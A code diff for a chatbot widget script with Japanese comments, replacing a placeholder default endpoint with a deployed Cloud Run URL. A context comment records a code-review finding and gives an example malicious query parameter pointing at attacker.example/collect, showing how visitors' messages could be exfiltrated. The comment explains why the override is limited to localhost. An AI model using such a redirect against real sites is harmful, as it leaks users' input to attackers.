@@ -5,14 +5,15 @@
   // map-search.js と同じ「末尾script + 専用JSモジュール + DOM自己注入」パターン。
   //
   // エンドポイント解決順: (1) このscriptタグの data-endpoint 属性 → (2) 下記デフォルト定数。
-  // デフォルトはまだ実デプロイされていないプレースホルダーであり、Cloud Run へのデプロイ完了後
-  // (chatbot/README.md 参照) に data-endpoint 属性で本番URLへ差し替える想定。
+  // index.html / jobs.html は明示的に data-endpoint を指定済み。デフォルトは
+  // 2026-07-24 デプロイ済みの本番Cloud Run URL (chatbot/README.md 参照) —
+  // data-endpoint を付け忘れた新規ページへの展開時のフォールバックとして機能する。
   //
   // ローカル確認用の ?chatbot_endpoint= クエリ上書きは localhost/127.0.0.1 でのみ有効
   // (/code-review high で指摘: 本番オリジンで無制限に許可すると、悪意あるURL
   // `?chatbot_endpoint=https://attacker.example/collect` を踏んだ訪問者の入力メッセージが
   // 攻撃者サーバーへ送信されてしまうデータ流出経路になる)。
-  var DEFAULT_ENDPOINT = 'https://aozora-chatbot-PENDING-DEPLOY.asia-northeast1.run.app/chat';
+  var DEFAULT_ENDPOINT = 'https://aozora-chatbot-1084369586348.asia-northeast1.run.app/chat';
   // chatbot/src/chatbot/config.py の AppConfig.max_history_turns (env
   // MAX_HISTORY_TURNS、既定6) と値が重複している。これは payload サイズを
   // 抑える送信側のヒントに過ぎず、バックエンドの _trim_history が最終的な
